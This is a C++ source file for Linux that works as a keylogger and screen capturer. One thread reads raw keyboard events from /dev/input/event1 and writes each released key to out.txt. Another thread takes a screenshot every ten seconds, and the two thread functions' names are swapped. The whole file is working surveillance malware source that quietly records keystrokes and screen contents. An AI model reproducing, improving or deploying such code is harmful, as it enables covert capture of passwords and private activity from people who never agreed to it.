#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <fstream>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <pthread.h>
#include <string>
using namespace std;

// global vars

void * key_logger(void *);
void * screenshot(void *);
pthread_t th1, th2;
int fd;
ofstream myfile;

const char *keycodes[] = {
    "RESERVED",
    "ESC",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",          
    "9",
    "0",
    "MINUS",
    "EQUAL",
    "BACKSPACE",
    "TAB",
    "Q",
    "W",
    "E",
    "R",
    "T",
    "Y",
    "U",
    "I",
    "O",
    "P",
    "LEFTBRACE",
    "RIGHTBRACE",
    "ENTER",
    "LEFTCTRL",
    "A",
    "S",
    "D",
    "F",
    "G",
    "H",
    "J",
    "K",
    "L",
    "SEMICOLON",
    "APOSTROPHE",
    "GRAVE",
    "LEFTSHIFT",
    "BACKSLASH",
    "Z",
    "X",
    "C",
    "V",
    "B",
    "N",
    "M",
    "COMMA",
    "DOT",
    "SLASH",
    "RIGHTSHIFT",
    "KPASTERISK",
    "LEFTALT",
    "SPACE",
    "CAPSLOCK",
    "F1",
    "F2",
    "F3",
    "F4",
    "F5",
    "F6",
    "F7",
    "F8",
    "F9",
    "F10",
    "NUMLOCK",
    "SCROLLLOCK"
};

// controll + c signall handler for closing the file and killing the threads

void sig_term_handler(int signum, siginfo_t *info, void *ptr)
{
      myfile.close();
      close(fd);
      pthread_cancel(th1);
      pthread_cancel(th2);
      exit(0);
}

void catch_sigterm()
{
    static struct sigaction _sigact;

    memset(&_sigact, 0, sizeof(_sigact));
    _sigact.sa_sigaction = sig_term_handler;
    _sigact.sa_flags = SA_SIGINFO;

    sigaction(SIGINT, &_sigact, NULL);
}

// main function

int main()
{
    catch_sigterm();
  
    myfile.open ("out.txt");

    fd = open("/dev/input/event1" , O_RDONLY);

    pthread_create(&th1, NULL, key_logger, NULL);
    pthread_create(&th2, NULL, screenshot, NULL);   
    pthread_join(th1, NULL);
    pthread_join(th2, NULL);
}

// thread functions

void * key_logger(void *ptr)
{
    int i = 0;
    while (1){
        system("gnome-screenshot -f screenshot");
        system( (string("mv screenshot screenshot" + to_string(i))).c_str() );
        sleep(10);
        i++;
    }  
}

void * screenshot(void *ptr)
{
    struct input_event ev;
    while (1) {
    usleep(100);
    read(fd , &ev , sizeof(ev));
    if ( (ev.type == EV_KEY) && (ev.value == 0) ) {
        myfile << keycodes[ev.code] << endl;
    }
  }  
}